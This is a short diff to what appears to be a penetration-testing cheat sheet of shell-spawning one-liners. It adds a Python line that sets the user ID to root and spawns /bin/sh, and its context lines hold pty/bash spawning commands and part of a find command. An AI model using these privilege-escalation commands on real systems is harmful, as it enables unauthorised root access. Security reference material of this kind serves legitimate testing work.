@@ -9,6 +9,7 @@ find / -o -group `id -g` -perm \ 
 ```
 - ```python3 -c 'import os; os.system("/bin/bash")'```
 - ```python -c 'import pty; pty.spawn("/bin/bash")'```
+- ```python -c 'import os; os.setuid(0); os.system("/bin/sh")'```
 - `echo os.system('/bin/bash')`
 ```
 exec "/bin/sh";
